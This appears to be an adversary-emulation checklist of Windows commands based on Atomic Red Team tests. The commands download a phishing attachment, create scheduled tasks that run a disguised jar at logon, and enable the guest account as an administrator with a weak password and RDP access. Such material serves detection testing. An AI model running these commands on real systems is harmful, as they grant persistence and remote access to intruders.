Initial Access
*
powershell -Command "$url='https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm"

*
powershell -Command "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter 'drivetype=2' | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives) { write-host 'Removable Drive Found:' $Drive; New-Item -Path $Drive\T1091Test1.txt -ItemType 'file' -Force -Value 'T1091 Test 1 has created this file to simulate malware spread to removable drives.' }"
Pre-req: powershell -Command "Out-File -FilePath '$env:TEMP\ExplorerSync.db'"

*
copy "%temp%\ExplorerSync.db" "%temp%\..\Microsoft\ExplorerSync.db"
schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc ONLOGON /f

*
net user guest /active:yes
net user guest  Password123
net localgroup Administrators guest  /add
net localgroup "Remote Desktop Users" guest  /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f


Execution
*
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" 
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

*
